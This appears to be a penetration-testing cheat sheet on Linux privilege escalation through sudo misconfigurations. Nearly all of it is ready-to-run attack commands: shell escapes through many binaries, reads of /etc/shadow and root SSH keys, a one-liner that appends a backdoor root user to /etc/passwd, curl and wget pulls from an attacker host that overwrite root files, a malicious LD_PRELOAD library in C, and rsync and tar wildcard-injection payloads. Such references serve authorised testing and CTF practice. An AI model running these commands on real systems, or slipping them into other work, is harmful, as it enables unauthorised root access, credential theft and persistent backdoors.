title: Linux PrivEsc — Sudo Abuse
html:
Linux PrivEsc — Sudo Abuse

Sudo misconfigurations are among the most common privilege escalation vectors. Always run sudo -l immediately upon getting a shell.

Check Sudo Rights

# List allowed sudo commands (no password needed)
sudo -l

# Show sudo version (older versions have CVEs)
sudo -V

# Try sudo with current password
sudo -l -S <<< '<password>'

Key patterns to look for in sudo -l output:

  • NOPASSWD — no password required to run command
  • ALL=(ALL) or ALL=(ALL:ALL) — full sudo access
  • (root) NOPASSWD: /path/to/binary — specific binary as root, no password
  • env_keep+=LD_PRELOAD — LD_PRELOAD exploit possible

NOPASSWD Entries

# Example /etc/sudoers entry:
# <username> ALL=(ALL) NOPASSWD: /usr/bin/vim

# Any NOPASSWD binary that can spawn a shell or read files = privesc
# Check GTFOBins: https://gtfobins.github.io/#+sudo

# Run the binary with sudo
sudo /usr/bin/vim

# Run as specific user
sudo -u root /usr/bin/vim

Sudo with Specific Binaries

awk

sudo awk 'BEGIN {system("/bin/sh")}'

find

sudo find . -exec /bin/sh \; -quit

vim / vi

sudo vim -c ':!/bin/sh'
sudo vi -c ':!/bin/sh'
# Inside vim: :set shell=/bin/sh then :shell

python / python3

sudo python -c 'import pty; pty.spawn("/bin/bash")'
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo python3 -c 'import os; os.system("/bin/bash")'

perl

sudo perl -e 'exec "/bin/sh";'

ruby

sudo ruby -e 'exec "/bin/sh"'

less / more

sudo less /etc/passwd
# Once in less, type: !/bin/sh

sudo more /etc/passwd
# Once in more, type: !/bin/sh

man

sudo man man
# Once in man, type: !/bin/sh

nano

sudo nano
# Ctrl+R, Ctrl+X, then: reset; sh 1>&0 2>&0

# Or read sensitive files
sudo nano /etc/shadow

cp

# Copy attacker-controlled authorized_keys to root
sudo cp /tmp/authorized_keys /root/.ssh/authorized_keys

# Overwrite /etc/passwd
sudo cp /tmp/passwd_with_root /etc/passwd

chmod

# Make /bin/bash SUID
sudo chmod +s /bin/bash
bash -p

# Make /etc/shadow readable
sudo chmod 777 /etc/shadow

env

sudo env /bin/sh

bash / sh

sudo bash
sudo sh
sudo /bin/bash

cat

# Read /etc/shadow
sudo cat /etc/shadow

# Read root SSH key
sudo cat /root/.ssh/id_rsa

tee

# Append new root user to /etc/passwd
echo 'hacker:$(openssl passwd -1 hacked):0:0:pwned:/root:/bin/bash' | sudo tee -a /etc/passwd

# Write SSH key to root
cat /tmp/id_rsa.pub | sudo tee /root/.ssh/authorized_keys

curl / wget

# Write file as root via curl
sudo curl http://<lhost>/authorized_keys -o /root/.ssh/authorized_keys
sudo curl http://<lhost>/passwd -o /etc/passwd

# wget
sudo wget http://<lhost>/authorized_keys -O /root/.ssh/authorized_keys

docker

# Mount host filesystem
sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# With specific image
sudo docker run -v /:/host --rm -it ubuntu chroot /host bash

lxd / lxc

# See Docker/LXD Groups page for full chain
sudo lxc exec <container> -- /bin/sh

LD_PRELOAD Exploit

If sudo -l shows env_keep+=LD_PRELOAD, load a malicious shared library that executes before the target binary.

# Step 1: Create malicious shared library
cat > /tmp/shell.c <<'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
EOF

# Step 2: Compile
gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles

# Step 3: Run any allowed sudo binary with LD_PRELOAD
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/find
# Replace /usr/bin/find with any NOPASSWD allowed binary

Sudoers Wildcard Abuse

If a sudoers entry allows running a script or binary with * (wildcard), pass malicious arguments interpreted as flags.

# Example sudoers entry:
# <username> ALL=(root) NOPASSWD: /usr/bin/rsync *

# rsync wildcard exploit — execute command via --rsh
sudo rsync -e 'sh -c "sh 0<&2 1>&2"' x x

# Example sudoers entry:
# <username> ALL=(root) NOPASSWD: /opt/script.sh *

# If script.sh uses $@ or $* unsanitized:
sudo /opt/script.sh '; /bin/bash'

tar Wildcard in Sudo

# If allowed: sudo tar * (in a writable dir)
echo '' > '--checkpoint=1'
echo '' > '--checkpoint-action=exec=sh shell.sh'
echo '#!/bin/bash' > shell.sh
echo 'cp /bin/bash /tmp/b; chmod +s /tmp/b' >> shell.sh
chmod +x shell.sh
sudo tar czf /dev/null *
/tmp/b -p
excerpt: Exploit sudo misconfigurations for Linux privilege escalation — NOPASSWD entries, GTFOBins sudo abuse, LD_PRELOAD, and wildcard injection techniques.
